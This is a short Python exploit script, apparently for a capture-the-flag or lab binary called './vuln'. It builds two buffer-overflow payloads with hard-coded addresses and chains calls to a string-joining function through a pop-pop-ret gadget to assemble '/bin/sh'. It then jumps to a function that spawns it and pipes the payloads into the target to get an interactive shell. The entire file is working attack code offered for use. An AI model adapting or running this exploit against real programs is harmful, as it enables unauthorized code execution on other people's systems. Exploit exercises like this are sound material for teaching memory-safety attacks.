import struct
import os

buf_eip = 12
buffer_buf = 128
buffer1_buff = 148

string = 0x804a060
str1 = 0x804a0c8
str2 = 0x804a0c4

join_string = 0x804849b
pop_pop_ret = 0x080485da

lazy = 0x80484bf

atk_vector1 = '/bin/' 
atk_vector1 += "A"*(buffer_buf-len(atk_vector1))
atk_vector1 += struct.pack("I", str1)
atk_vector1 += '\n'

atk_vector2 = 'sh'
atk_vector2 += '\0'
atk_vector2 += "A"*(buffer1_buff-len(atk_vector2))
atk_vector2 += struct.pack("I", str2)*3 #4*3 = 12
atk_vector2 += struct.pack("I", join_string)
atk_vector2 += struct.pack("I", pop_pop_ret)
atk_vector2 += struct.pack("I", string)
atk_vector2 += struct.pack("I", str1)

atk_vector2 += struct.pack("I", join_string)
atk_vector2 += struct.pack("I", pop_pop_ret)
atk_vector2 += struct.pack("I", string)
atk_vector2 += struct.pack("I", str2)

atk_vector2 += struct.pack("I", lazy)
atk_vector2 += '\n'

f = open('fla1', 'w+')
f.write(atk_vector1)

f = open('fla2', 'w+')
f.write(atk_vector2)
f.close()

os.system("(cat {}; cat {}; cat) | ./vuln".format('fla1', 'fla2'))


